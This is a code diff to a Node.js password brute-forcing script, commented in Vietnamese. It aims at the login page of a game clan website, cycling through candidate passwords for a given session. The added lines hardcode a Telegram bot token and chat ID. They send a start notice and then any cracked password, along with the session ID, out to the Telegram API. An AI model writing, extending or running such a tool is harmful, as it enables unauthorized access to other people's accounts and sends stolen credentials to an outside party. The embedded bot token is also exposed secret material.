@@ -8,6 +8,10 @@ const { nextUnique, saveBitmap, getUsedCount } = require("./unique7_bitmap");
 const args = minimist(process.argv.slice(2));
 const SESSION_ID = args.session;
 
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = "6360441262:AAFfPNBTskWNwjZSjAkuptnCezHCtMCXEUM";
+const TELEGRAM_CHAT_ID = "6153638404";
+
 if (!SESSION_ID) {
   console.error("❌ Vui lòng cung cấp session ID:");
   console.error("   Ví dụ: node main.js --session=pahduuacee2jq0cnneun6fvkq3");
@@ -18,6 +22,27 @@ const LOGIN_URL = "http://av1.teamobi.com/clan/?act=login";
 
 function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+// Function gửi thông báo đến Telegram
+async function sendTelegramMessage(message) {
+  try {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    const response = await axios.post(telegramUrl, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+    });
+
+    if (response.data.ok) {
+      console.log("📱 Đã gửi thông báo Telegram thành công!");
+    } else {
+      console.error("❌ Lỗi gửi Telegram:", response.data.description);
+    }
+  } catch (error) {
+    console.error("❌ Lỗi kết nối Telegram:", error.message);
+  }
 }
 
 async function tryPassword(pass) {
@@ -69,6 +94,18 @@ async function tryPassword(pass) {
     } else {
       console.log(`✅ ĐÚNG MẬT KHẨU: ${pass}`);
       fs.appendFileSync("result.txt", `Mật khẩu đúng: ${pass}\n`);
+
+      // Gửi thông báo đến Telegram khi tìm được mật khẩu đúng
+      const successMessage = `🎉 <b>TÌM ĐƯỢC MẬT KHẨU!</b>
+
+🔑 <b>Password:</b> <code>${pass}</code>
+🆔 <b>Session:</b> <code>${SESSION_ID}</code>
+⏰ <b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}
+
+✅ Brute force hoàn thành thành công!`;
+
+      await sendTelegramMessage(successMessage);
+
       return true;
     }
   } catch (err) {
@@ -80,6 +117,17 @@ async function tryPassword(pass) {
 async function bruteForce() {
   let count = 0;
   console.log("🔁 Bắt đầu dò, đã dùng:", getUsedCount());
+
+  // Gửi thông báo bắt đầu brute force
+  const startMessage = `🚀 <b>BẮT ĐẦU BRUTE FORCE</b>
+
+🆔 <b>Session:</b> <code>${SESSION_ID}</code>
+⏰ <b>Thời gian bắt đầu:</b> ${new Date().toLocaleString("vi-VN")}
+🔢 <b>Đã dùng:</b> ${getUsedCount()} passwords
+
+🔄 Đang tiến hành dò mật khẩu...`;
+
+  await sendTelegramMessage(startMessage);
 
   while (true) {
     const pass = nextUnique();
